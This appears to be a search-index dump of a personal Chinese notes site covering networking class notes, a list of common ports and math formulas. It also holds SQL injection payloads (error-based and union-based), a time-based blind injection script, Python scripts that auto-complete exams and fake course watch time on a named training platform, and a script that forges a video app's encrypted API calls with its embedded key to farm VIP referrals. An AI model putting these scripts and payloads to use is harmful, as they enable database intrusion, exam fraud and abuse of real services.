md5_AddUnsigned(md5_AddUnsigned(md5_G(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_HH(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_H(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_II(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_I(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_ConvertToWordArray(string) { var lWordCount; var lMessageLength = string.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount \u0026lt; lMessageLength) { lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) \u0026lt;\u0026lt; lBytePosition)); lByteCount++; } lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 \u0026lt;\u0026lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength \u0026lt;\u0026lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength \u0026gt;\u0026gt;\u0026gt; 29; return lWordArray; }; function md5_WordToHex(lValue) { var WordToHexValue = \u0026#34;\u0026#34;, WordToHexValue_temp = \u0026#34;\u0026#34;, lByte, lCount; for (lCount = 0; lCount \u0026lt;= 3; lCount++) { lByte = (lValue \u0026gt;\u0026gt;\u0026gt; (lCount * 8)) \u0026amp; 255; WordToHexValue_temp = \u0026#34;0\u0026#34; + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); } return WordToHexValue; }; function md5_Utf8Encode(string) { string = string.replace(/\\r\\n/g, \u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if ((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; string = md5_Utf8Encode(string); x = md5_ConvertToWordArray(string); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k \u0026lt; x.length; k += 16) { AA = a; BB = b; CC = c; DD = d; a = md5_FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = md5_FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = md5_FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = md5_FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = md5_FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = md5_FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = md5_FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = md5_FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = md5_FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = md5_FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = md5_FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = md5_FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = md5_FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = md5_FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = md5_FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = md5_FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = md5_GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = md5_GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = md5_GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = md5_GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = md5_GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = md5_GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = md5_GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = md5_GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = md5_GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = md5_GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = md5_GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = md5_GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = md5_GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = md5_GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = md5_GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = md5_GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = md5_HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = md5_HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = md5_HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = md5_HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = md5_HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = md5_HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = md5_HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = md5_HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = md5_HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = md5_HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = md5_HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = md5_HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = md5_HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = md5_HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = md5_HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = md5_HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = md5_II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = md5_II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = md5_II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = md5_II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = md5_II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = md5_II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = md5_II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = md5_II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = md5_II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = md5_II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = md5_II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = md5_II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = md5_II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = md5_II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = md5_II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = md5_II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = md5_AddUnsigned(a, AA); b = md5_AddUnsigned(b, BB); c = md5_AddUnsigned(c, CC); d = md5_AddUnsigned(d, DD); } return (md5_WordToHex(a) + md5_WordToHex(b) + md5_WordToHex(c) + md5_WordToHex(d)).toLowerCase(); } "},{"id":60,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/%E5%B1%80%E5%9F%9F%E7%BD%91-%E6%80%9D%E7%A7%91-pt/","title":"局域网 思科 pt","section":"class notes","content":"![[Pasted image 20240909162940.png]]\n第二节课\r#\renable conf t hostname xxx 配置线连 PC 连 RS 232 连 交换机Console 直通线\n第三节课\r#\ren #进入特权模式 conf t #进入配置模式 enable password xxx # 在配置模式下设置进入特权模式的密码xxx show run # 查看运行过的命令 no xxx xxx # 取消某一条命令或者配置 no en pa # 取消密码 vlan 配置\r#\r配置模式\nint vlan 1 # 进入vlan 1 接口(vlan 是虚拟接口) ip address 192.168.1.1 255.255.255.0 # 设置ip地址 no shutdown # 打开接口 远程登录，进入配置模式\nline vty 0 4 password 123 # 设置密码 login # 开启 end # 推出 pc 打开终端\ntelnet 192.168.1.1 第四节课\r#\rssh配置\n# 用户名ljyh，密码123 username ljyh passowrd 123 # 此处可能提示Please define a hostname other than Switch. # 使用 hostname xxx 改名字即可 ip domain-name sj2301.com crypto key generate rsa # 直接回车或者输入1024 ----------------- R2(config)#ip domain-name man.com //配置域名为man.com R2(config)#crypto key generate rsa //生成加密密钥 R2(config)#username man secret cisco //在本地创建一个用户名为man并且加密密码为cisco的用户。 R2(config-line)#transport input ssh //启用SSH登陆 R2(config-line)#login local //采用本地验证 vlan 配置\nSwitch\u0026gt;en Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#vlan 2 Switch(config-vlan)#exit Switch(config)#vlan 3 Switch(config-vlan)#exit Switch(config)#int fa 0/1 Switch(config-if)#sw ac vlan 2 Switch(config-if)#exit Switch(config)#int fa 0/2 Switch(config-if)#sw ac vlan 3 Switch(config-if)#exit Switch(config)#int fa 0/24 Switch(config-if)#sw mode trunk Switch(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to up Switch(config-if)#exit Switch(config)#end Switch# 第四节课\r#\r端口聚合\n多端口选择 int range fa0/5-6 启用端口聚合 Switch(config-if-range)#channel-group 1 mode on 设置为trunk sw mo t 设置均衡负载 有dst-ip和dst-mac，一般用mac 地址\nSwitch(config)#port-channel load-balance dst-mac 第五节课\r#\r连线，ip设置 ![[Pasted image 20241014143109.png]] 2. 二层交换机，设置vlan\n//创建vlan vlan 10 e vlan 20 e //进入配置 0/1 int fa 0/1 sw ac vlan 10 e //进入配置 0/2 int fa 0/2 sw ac vlan 20 e int fa 0/24 sw m t 三层，步骤先同上，但是没有int fa 0/24 和 sw m t 然后，设置ip 地址\nint vlan 10 ip ad 192.168.1.1 255.255.255.0 e int vlan 20 ip ad 192.168.2.1 255.255.255.0 e //这一步好像叫转发 ip routing 记得给对应的pc 设置默认网关。\n生成树协议\r#\r先画一个换线的拓扑结构 ![[Pasted image 20241014144055.png]] 知识点\n根网桥 根端口 指定端口 阻塞端口 路由器\r#\r弄个路由器出来，先断电，没亮就行 然后拖动下面这个模块到上面去。 ![[Pasted image 20241014145120.png]]\n![[Pasted image 20241014145209.png]] 基本的\nen conf t hostname xxx01 pc ip地址设置以及网关 ![[Pasted image 20241014161444.png]]\n交换机 vlan 划分 vlan 10 e int fa 0/1 sw m ac sw ac vlan 10 e vlan 20 vlan 30 .... .... int fa 0/24 sw m t end 路由器 记得开启\n![[Pasted image 20241014161345.png]]\nint fa0/0.1 encapsulation dot1Q 10 ip ad 192.168.1.1 255.255.255.0 int fa0/0.2 encapsulation dot1Q 20 ip ad 192.168.2.1 255.255.255.0 int fa0/0.3 encapsulation dot1Q 30 ip ad 192.168.3.1 255.255.255.0 要添加就继续cv即可 .... end 静态路由 此处我没听课，只听了一点点\n![[Pasted image 20241014165523.png]]\n![[Pasted image 20241014165542.png]]\n先断电，然后用HWIC-2T 这个模块，拖上去，开电，反复。然后使用自动配置线，就有这个闪电的这个线了。\nip route [目标网络] [子网掩码] [下一跳的IP地址] 动态路由 没听\n"},{"id":61,"href":"/docs/re/new/%E5%B1%B1%E8%A5%BF%E6%81%92%E5%AE%89%E5%88%B7%E8%AF%BE%E4%BB%A5%E5%8F%8A%E8%80%83%E8%AF%95/","title":"山西恒安刷课以及考试","section":"demo","content":"软件正常无法抓包，简单绕过，无加密，整个流程可也说是设计得比较好，就是有点费服务器，斻多API，都是一条一条拉满了的，以下是python代码\n考试\nimport requests, json header={ \u0026#39;Host\u0026#39;: \u0026#39;nazx.yunkeonline.cn\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;x-access-token\u0026#39;: \u0026#39;8ECDCD1C5FCC04DE8E35C5255185385F7CFE78459FAE318A432E95140FC1CFFC\u0026#39;, \u0026#39;app-version\u0026#39;: \u0026#39;2.1.0\u0026#39;, \u0026#39;app-os\u0026#39;: \u0026#39;ANDROID\u0026#39;, \u0026#39;code-version\u0026#39;: \u0026#39;2.1.1\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/3.14.9\u0026#39;, } def login(uname,pwd): headers = { \u0026#39;Host\u0026#39;: \u0026#39;nazx.yunkeonline.cn\u0026#39;, \u0026#39;app-version\u0026#39;: \u0026#39;2.1.0\u0026#39;, \u0026#39;app-os\u0026#39;: \u0026#39;ANDROID\u0026#39;, \u0026#39;code-version\u0026#39;: \u0026#39;2.1.1\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json;charset=UTF-8\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/3.14.9\u0026#39;, } data = {\u0026#34;bindMobile\u0026#34;:uname,\u0026#34;imageCode\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;password\u0026#34;:pwd,\u0026#34;username\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;verifyCode\u0026#34;:\u0026#34;\u0026#34;} response = requests.post(\u0026#39;https://nazx.yunkeonline.cn/c/user/login\u0026#39;, headers=headers, json=data) print(response.text) return response.json()[\u0026#39;result\u0026#39;][\u0026#39;token\u0026#39;] def get_courseId(): params = { \u0026#39;statusList\u0026#39;: \u0026#39;1,2\u0026#39;, \u0026#39;pageNo\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;pageSize\u0026#39;: \u0026#39;3\u0026#39;, } response = requests.get(\u0026#39;https://nazx.yunkeonline.cn/c/trainPlan/getMyPlan\u0026#39;, params=params, headers=header) classId=response.json()[\u0026#39;result\u0026#39;][\u0026#39;records\u0026#39;][0][\u0026#39;trainPlanId\u0026#39;] params = { \u0026#39;classId\u0026#39;: classId, } response = requests.get(\u0026#39;https://nazx.yunkeonline.cn/c/trainPlan/getAppClassTaskList\u0026#39;, params=params, headers=header) return response.json()[\u0026#39;result\u0026#39;][\u0026#39;trainPlanStageDetailDtos\u0026#39;][1][\u0026#39;planAppTaskListDtos\u0026#39;][0][\u0026#39;taskId\u0026#39;] def get_question_list(id): response = requests.get(f\u0026#39;https://nazx.yunkeonline.cn/c/exam/getQuestionList/{id}\u0026#39;, headers=header) for i in response.json()[\u0026#39;result\u0026#39;]: with open(\u0026#39;answer.json\u0026#39;, \u0026#39;r\u0026#39;) as f: answers=json.load(f) for j in answers[\u0026#39;result\u0026#39;]: if j[\u0026#39;id\u0026#39;]==i[\u0026#39;id\u0026#39;]: print(j[\u0026#39;analysis\u0026#39;],\u0026#39; ==\u0026gt; \u0026#39;,answer) answer=j[\u0026#39;answer\u0026#39;] answerQuestion(answer,id,j[\u0026#39;id\u0026#39;]) return response.json()[\u0026#39;result\u0026#39;] def start_exam(id): response = requests.post(f\u0026#39;https://nazx.yunkeonline.cn/c/exam/startExam/{id}\u0026#39;, headers=header) print(response.text) def answerQuestion(answer,id,qid): data = {\u0026#39;answer\u0026#39;:answer,\u0026#39;examinationId\u0026#39;:id,\u0026#39;questionId\u0026#39;:qid} response = requests.post(\u0026#39;https://nazx.yunkeonline.cn/c/exam/answerQuestion\u0026#39;, headers=header, json=data) def submit_exam(id): response = requests.post(f\u0026#39;https://nazx.yunkeonline.cn/c/exam/submit/{id}/0\u0026#39;, headers=header) print(response.text) print(\u0026#34;考试完成\u0026#34;) def run(): header[\u0026#39;x-access-token\u0026#39;]=login(phone,pwd) id=get_courseId() start_exam(id) get_question_list(id) submit_exam(id) phone=\u0026#34;150343xxxx\u0026#34; pwd=\u0026#34;xx\u0026#34; run() 刷课, 只想到了多线程,异步没能实现，理论上可，但是失败了 开了36线程的线程池，10 ==\u0026gt;360秒，1分钟看36分钟，算总时常，异步理论上更佳，奈何实力不到\nimport requests,time from concurrent.futures import ThreadPoolExecutor header={ \u0026#39;Host\u0026#39;: \u0026#39;nazx.yunkeonline.cn\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;x-access-token\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;app-version\u0026#39;: \u0026#39;2.1.0\u0026#39;, \u0026#39;app-os\u0026#39;: \u0026#39;ANDROID\u0026#39;, \u0026#39;code-version\u0026#39;: \u0026#39;2.1.1\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/3.14.9\u0026#39;, } def login(uname,pwd): headers = { \u0026#39;Host\u0026#39;: \u0026#39;nazx.yunkeonline.cn\u0026#39;, \u0026#39;app-version\u0026#39;: \u0026#39;2.1.0\u0026#39;, \u0026#39;app-os\u0026#39;: \u0026#39;ANDROID\u0026#39;, \u0026#39;code-version\u0026#39;: \u0026#39;2.1.1\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json;charset=UTF-8\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/3.14.9\u0026#39;, } data = {\u0026#34;bindMobile\u0026#34;:uname,\u0026#34;imageCode\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;password\u0026#34;:pwd,\u0026#34;username\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;verifyCode\u0026#34;:\u0026#34;\u0026#34;} response = requests.post(\u0026#39;https://nazx.yunkeonline.cn/c/user/login\u0026#39;, headers=headers, json=data) print(response.text) return response.json()[\u0026#39;result\u0026#39;][\u0026#39;token\u0026#39;] def get_courseId(): params = { \u0026#39;statusList\u0026#39;: \u0026#39;1,2\u0026#39;, \u0026#39;pageNo\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;pageSize\u0026#39;: \u0026#39;3\u0026#39;, } response = requests.get(\u0026#39;https://nazx.yunkeonline.cn/c/trainPlan/getMyPlan\u0026#39;, params=params, headers=header) classId=response.json()[\u0026#39;result\u0026#39;][\u0026#39;records\u0026#39;][0][\u0026#39;trainPlanId\u0026#39;] params = { \u0026#39;classId\u0026#39;: classId, } response = requests.get(\u0026#39;https://nazx.yunkeonline.cn/c/trainPlan/getAppClassTaskList\u0026#39;, params=params, headers=header) return response.json()[\u0026#39;result\u0026#39;][\u0026#39;trainPlanStageDetailDtos\u0026#39;][0][\u0026#39;planAppTaskListDtos\u0026#39;][0][\u0026#39;taskId\u0026#39;] def get_all_lesson(): header[\u0026#39;x-access-token\u0026#39;]=login(phone,pwd) params = { \u0026#39;courseId\u0026#39;: get_courseId(), } print(params) response = requests.get(\u0026#39;https://nazx.yunkeonline.cn/c/courseApi/getLessonList\u0026#39;, params=params, headers=header) ids=[] for i in response.json()[\u0026#39;result\u0026#39;]: for _ in i[\u0026#39;lessons\u0026#39;]: if _[\u0026#39;progress\u0026#39;]!=2: ids.append({\u0026#39;id\u0026#39;: _[\u0026#39;id\u0026#39;],\u0026#39;title\u0026#39;:_[\u0026#39;title\u0026#39;],\u0026#34;duration\u0026#34;:_[\u0026#39;duration\u0026#39;]}) return ids def queryLessonPlaytime(x): _id=x[\u0026#39;id\u0026#39;] response = requests.get(f\u0026#39;https://nazx.yunkeonline.cn/course/api/monitor/queryLessonPlaytime/{_id}\u0026#39;, headers=header) result=response.json() playTime=0 duration=x[\u0026#39;duration\u0026#39;] if result==\u0026#34;200\u0026#34;: playTime=result[\u0026#39;info\u0026#39;][\u0026#39;playtime\u0026#39;] duration=result[\u0026#39;info\u0026#39;][\u0026#39;maxPlaytime\u0026#39;] else: startPlay(x[\u0026#39;id\u0026#39;]) print(response.text) addPlaytime(x[\u0026#39;id\u0026#39;],duration,playTime) def startPlay(id): response = requests.get( f\u0026#39;https://nazx.yunkeonline.cn/course/api/CourseLesson/course/5479/lesson/{id}/start\u0026#39;, headers=header, ) print(response.text) def addPlaytime(id,duration,playTime=0): params = { \u0026#39;lessonId\u0026#39;: id, \u0026#39;playTime\u0026#39;: playTime, \u0026#39;lessonType\u0026#39;: \u0026#39;video\u0026#39;, } while playTime\u0026lt;duration: playTime+=10 if playTime\u0026gt;=duration: finsih() playTime+=100 return params[\u0026#39;playTime\u0026#39;]=playTime response = requests.post(\u0026#39;https://nazx.yunkeonline.cn/course/api/monitor/addPlaytime\u0026#39;, params=params, headers=header) print(response.text) time.sleep(10) def finsih(id): params = { \u0026#39;userId\u0026#39;: \u0026#39;107000\u0026#39;, } response = requests.get( f\u0026#39;https://nazx.yunkeonline.cn/course/api/CourseLesson/course/5479/lesson/{id}/finish\u0026#39;, params=params, headers=header, ) print(response.text) phone=\u0026#34;1503435xxx\u0026#34; pwd=\u0026#34;xx\u0026#34; get_all_lesson() def run(): with ThreadPoolExecutor(max_workers=36) as t: test=get_all_lesson() print(test) for x in test: print(x) t.submit(queryLessonPlaytime,x) # run() "},{"id":62,"href":"/docs/network-security/other/%E7%AB%AF%E5%8F%A3/","title":"常见端口","section":"other","content":"常见端口\n21 22 23 3389 5900 5632 69 139 389 2094 53 6768 80 443 25 110 143 161 1433 1521 3306 5000 5432 6379 9200 270117 22122 81 8080 9080 9081 9090 3700 4848 83 84 85 86 87 88 161 389 445 512 513 514 873 1025 1433 1521 2082 2083 2222 2601 2604 3128 3306 3312 3311 3389 4440 4848 5984 6082 6379 7001 7002 7778 8083 8649 8888 9000 9200 9300 10000 11211 27017 27018 28017 50000 50070 50060 50030 "},{"id":63,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","title":"报错注入","section":"php","content":"报错注入\nupdatexml(1,欲查询代码,1) 参数一：String，为XML对象\n参数二：XML语句\n参数三：查找到后欲替换的数据\nextractvalue(1,欲查询代码) 参数一：String,为XML文档对象\n参数二：XML语句\n错误的xml语句会抛出错误，可以看到我们的查询语句\nor updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1),\u0026#39;2\u0026#39;)# 适当修改查询语句即可\n报错语句过长，显示不全\nselect mid(flag,1,16) from flag select mid(flag,17,16) from flag 多条数据用limit\nselect flag from flag limit 0,1 select flag from flag limit 0,2 group_concat不能同时配合limit使用\n"},{"id":64,"href":"/docs/learm/math/%E6%95%B0%E5%88%97/","title":"数列","section":"math","content":"\r等差数列\r#\r通项公式\n$$ A_n=A_1+(n-1)*d $$\n求和公式\n$$ S_n=\\frac{(A_1+A_{n-1})*n}{2} $$\n等比数列\r#\r通项公式\n$$ A_n=A_1*q^{n-1} $$\n求和公式\n$$ S_n=a_1\\frac{1-q^n}{1-q} $$\n"},{"id":65,"href":"/docs/learm/math/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/","title":"数学公式测试","section":"math","content":"$$ \\begin{aligned} \\lim_{x\\rightarrow 0} \\frac {tanx -sinx} {x^3} \\frac {sinx}{cosx} -sinx \\\\ \\frac {sinx}{cosx} - \\frac {sin^2x}{sinx} \\\\ \\frac { sin^2x -cosx * sin^2x} {sinx * cosx} \\\\ \\frac {sinx(1-cosx)} {cosx} \\\\ \\frac {sinx(1-cosx)} {cosx * x^3} \\\\ \\frac {\\frac{x^3}{x}}{cosx ~ x^3} \\\\ \\frac {x^3}{2} ~\\frac{1}{cosx * x^3} \\\\ \\frac {1}{2cosx} \\\\\n\\lim_{x\\rightarrow 0} \\frac {tanx -sinx} {x^3}=\\frac {1}{2} \\end{aligned}\n$$\n"},{"id":66,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/","title":"整型注入","section":"php","content":"整形注入\n测试\nid=1 and 1=1 查询字段数,小于等于不报错，大于报错\nid=1 order by 3 确定字段数后，数据库名\nid=1111 union select 1,2,database() 表名\nid=1111 union select 1,2,group_concat(table_name) form information_schema.tables where table_schema=database()%23 字段\nid=1111 union select 1,2,group_concat(column_name) form information_schema.columns where and table_schema=database() table_name=\u0026#39;users\u0026#39;%23 查值\nid=1111 union select 1,2,username form users%23 查其他数据库\nid=1111 union select 1,2,group_concat(schema_name) form information_schema.schemata%23 "},{"id":67,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/","title":"时间注入","section":"php","content":"时间盲注\n不会抛出错误语句，怎们都是返回一样的\njb不知道什么问题python发包时用parse不行，要直接拼在url上\nimport requests,time name = \u0026#39;\u0026#39; for i in range(1,10): low = 32 high = 128 mid = (low + high) // 2 while low \u0026lt; high: # 爆出数据库名 url=\u0026#34;http://127.0.0.1/Less-9/?id=1\u0026#39; and if(ascii(substr((select database()),{0},1))\u0026gt;{1},sleep(1),0)--+\u0026#34;.format(i,mid) start_time = time.time() # 注入前的系统时间 r = requests.get(url) end_time = time.time() # 注入后的时间 if end_time - start_time \u0026gt; 1: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid \u0026lt;= 32 or mid \u0026gt;= 128: break name = name + chr(mid) print (name) "},{"id":68,"href":"/docs/re/new/%E6%9F%90h%E8%BD%AF%E4%BB%B6/","title":"某h软件","section":"demo","content":"某个视频软件,我拿到最初的版本是有各类防护的(检测root,代理,抓包)\n但是在网上找到一个版本好像都给干掉了,下面是用来刷vip的\nai\nfrom hashlib import md5 import time import requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import base64,json import random MODE = AES.MODE_ECB PAD_STYLE = \u0026#39;pkcs7\u0026#39; ENCODING = \u0026#39;UTF-8\u0026#39; key=\u0026#39;l8N2iooyp07M9IWa\u0026#39; url=\u0026#39;http://apichlove.com\u0026#39; def encrypt(plaintext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) cipher = AES.new(key_bytes, MODE) plaintext_bytes = plaintext.encode(ENCODING) plaintext_bytes_padded = pad(plaintext_bytes, AES.block_size, PAD_STYLE) ciphertext_bytes = cipher.encrypt(plaintext_bytes_padded) ciphertext_base64_bytes = base64.b64encode(ciphertext_bytes) ciphertext = ciphertext_base64_bytes.decode(ENCODING) return ciphertext def decrypt(ciphertext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) decrypter = AES.new(key_bytes, MODE) ciphertext_base64_bytes = ciphertext.encode(ENCODING) ciphertext_bytes = base64.b64decode(ciphertext_base64_bytes) plaintext_bytes_padded = decrypter.decrypt(ciphertext_bytes) plaintext_bytes = unpad(plaintext_bytes_padded, AES.block_size, PAD_STYLE) plaintext = plaintext_bytes.decode(ENCODING) return plaintext def x_t(url): a = [] b = [] # url = \u0026#39;app/api/auth/login/device\u0026#39; v1 = str(int(time.time())) v2 = md5(v1.encode()).hexdigest()[:8] a.append(\u0026#39;md5\u0026#39;) a.append(key) a.append(v1) a.append(v2) a.append(url) v3 = \u0026#39;|\u0026#39;.join(a) v3 = md5(v3.encode()).hexdigest() b.append(\u0026#39;md5\u0026#39;) b.append(v1) b.append(v2) b.append(v3) return \u0026#39;|\u0026#39;.join(b) def getRandom(randomlength=16): digits=\u0026#39;0123456789\u0026#39; ascii_letters=\u0026#39;abcdefghigklmnopqrstuvwxyz\u0026#39; str_list =[random.choice(digits +ascii_letters) for i in range(randomlength)] random_str =\u0026#39;\u0026#39;.join(str_list) return random_str def Token(): device_id=\u0026#39;b2ad30fc-0301-3d50-a97f-\u0026#39;+getRandom(12) data = json.dumps({\u0026#34;channel\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;device_no\u0026#34;: device_id,\u0026#34;device_type\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;}) data={\u0026#39;data\u0026#39;:encrypt(data,key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header = {\u0026#39;X-JSL-API-AUTH\u0026#39;: x_t(\u0026#39;/app/api/auth/login/device\u0026#39;)} result = requests.post(url+\u0026#39;/app/api/auth/login/device\u0026#39;, json=data, headers=header).json() msg=decrypt(result[\u0026#39;data\u0026#39;],key) # print(msg) return json.loads(msg)[\u0026#39;auth\u0026#39;][\u0026#39;token\u0026#39;],device_id def x_token(device_id,token): Json=json.dumps({\u0026#34;device_no\u0026#34;:device_id,\u0026#34;device_type\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;token\u0026#34;:token,\u0026#34;version\u0026#34;:\u0026#34;1.0.0\u0026#34;}) return encrypt(Json,key) def parent(code): token,device_id=Token() data={\u0026#39;data\u0026#39;:encrypt(json.dumps({\u0026#39;code\u0026#39;:code}),key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header={\u0026#39;X-JSL-API-AUTH\u0026#39;:x_t(\u0026#39;/app/api/user/bindcode\u0026#39;),\u0026#39;X-TOKEN\u0026#39;:x_token(device_id=device_id,token=token)} result=requests.post(url+\u0026#39;/app/api/user/bindcode\u0026#39;,json=data,headers=header).json() print(result) print(decrypt(result[\u0026#39;data\u0026#39;],key)) 